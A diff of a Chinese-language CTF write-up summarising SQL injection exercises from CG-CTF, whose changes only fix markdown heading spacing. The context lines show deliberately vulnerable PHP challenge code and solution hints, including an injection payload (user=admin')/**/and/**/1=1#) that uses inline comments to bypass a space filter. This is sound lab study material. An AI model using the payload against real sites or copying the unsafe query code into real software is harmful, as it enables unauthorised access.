@@ -1,6 +1,6 @@
-#sql注入做题总结
+# sql注入做题总结
 
-###1.CG-CTF:MYSQL
+### 1.CG-CTF:MYSQL
 ```php
 <?php
   $id = intval($_GET[id]);
@@ -16,7 +16,7 @@
 ```
     wp：精度问题，id=1024.1得到flag
     
-###2.CG-CTF:SQL注入1
+### 2.CG-CTF:SQL注入1
 ```php
 if($_POST[user] && $_POST[pass]) {
     mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
@@ -39,7 +39,7 @@ echo $query[user];
     wp:直接构造and 1 = 1的结构，注意需要替代空格
     user=admin')/**/and/**/1=1#&pass=123
     
-###3.CG-CTF:SQLInjection
+### 3.CG-CTF:SQLInjection
 ```php
 <?php
 function clean($str){
